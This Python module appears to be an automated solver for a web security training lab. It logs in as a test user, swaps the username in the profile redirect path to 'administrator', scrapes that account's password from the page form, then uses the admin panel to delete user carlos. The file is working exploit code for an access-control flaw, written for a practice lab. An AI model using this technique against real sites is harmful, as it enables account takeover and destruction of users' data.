from bs4 import BeautifulSoup
from ..utils import *


def solve_lab(session, *args):
    # Get user profile path
    csrf = session.get_csrf_token("/login")
    data = {"csrf": csrf, "username": "wiener", "password": "peter"}

    print_info(
        f"Getting user profile path by extracting the redirect link from logging in..."
    )
    resp = session.post_path("/login", data=data, allow_redirects=False)

    if resp.status_code != 302:
        print_fail("Invalid credentials.")
    else:
        location = resp.headers["Location"]
        print_success(f"Login successful. Location: {location}\n")

    # Extract administrator password
    location = location.replace("wiener", "administrator")
    print_info(f'Visiting "{session.url}{location}"...')
    resp = session.get_path(location)

    if resp.status_code != 200:
        print_fail("Unable to visit URL.")

    soup = BeautifulSoup(resp.text, "lxml")
    password = soup.select_one('input[name="password"]').get("value")

    if password is None:
        print_fail("Unable to extract administrator password.")
    else:
        print_success(f"Administrator password: {password}\n")

    # Delete user carlos
    session.login("administrator", password)

    print_info(
        f'Extracting path to delete user carlos by visiting "{session.url}admin"...'
    )
    resp = session.get_path("/admin")

    soup = BeautifulSoup(resp.text, "lxml")
    tag = soup.find(lambda tag: tag.has_attr("href") and "carlos" in tag.get("href"))

    if tag is None:
        print_fail("Unable to find path.")
    else:
        delete = tag.get("href")
        print_success(f"Found path: {delete}\n")

    print_info("Deleting user carlos...")
    session.get_path(delete)
